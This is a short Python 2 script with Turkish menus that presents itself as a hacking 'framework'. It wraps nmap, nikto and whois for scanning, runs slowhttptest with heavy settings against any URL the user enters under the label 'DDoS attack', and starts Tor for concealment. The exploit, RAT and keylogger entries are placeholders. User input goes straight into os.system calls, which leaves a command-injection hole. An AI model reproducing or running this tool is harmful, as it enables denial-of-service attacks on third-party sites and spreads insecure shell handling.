#! usr/bin/ python

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet PS1K0L0G FRAMEWROK")

print(""""" Ps1k0l0g framewroka hosgeldiniz 

+-----TARAMA ve BILGI TOPLAMA-----+
|1 Port Tarama                    |
|2 Zaafiyet Analizi               |
|3 Bilgi Toplama                  |
+---------------------------------+

+-----SALDIRILAR-----+
|4 DDoS Saldirisi    |+---+
|5 -
|6 Exploit Saldirisi      |
+-------------------------+

+-----VIRUS SALDIRILARI-----+
|7 Rat                      |
|8 KeyLogger                |
+---------------------------+

+-----GIZLENME-----+
|9 Gizli Ag Yapisi |
+------------------+


""""""""""")
islemno = raw_input("Islem Numarasini Girin:")
if(islemno=="1"):
  os.system("clear")
  print("Port Taramayi Sectiniz")
  hedefip = raw_input("Ip Adresi Girin:")
  os.system("nmap -sV " + hedefip)
elif(islemno=="2"):
 os.system("clear")
 print("Zaafiyet Analizini Sectiniz")
 analizip = raw_input("Analiz icin Ip Adresini Girin:")
 os.system("nikto -h " + analizip)
elif(islemno=="3"):
  os.system("clear")
  print("Blgi Toplamayi Sectiniz")
  bsite = raw_input("Bilgi Toplanacak Siteyi Girin:")
  os.system("whois " + bsite)
elif(islemno=="4"):
  os.system("clear")
  print("DDoS Saldirisini Sectiniz")
  os.system("sudo apt-get install slowhttptest")
  os.system("clear")
  hedefsite = raw_input("Hedef Site URL Girin:")
  os.system("slowhttptest -c 9999 -l 1000 -r 50 -s 4096 -x 4096 -u " + hedefsite)

if(islemno=="6"):
 print("Exploit Saldirisi Su an aktif degildir..")
if(islemno=="7"):
 print("Bu Secenek Su Anda Aktif Degildir")
if(islemno=="8"):
 print("Bu Secenek Su anda Aktif Degildir")
elif(islemno=="9"):
 os.system("clear")
 print("Gizlenmeyi Sectiniz")
 os.system("apt-get install tor")
 os.system("service tor start")










    
 






 
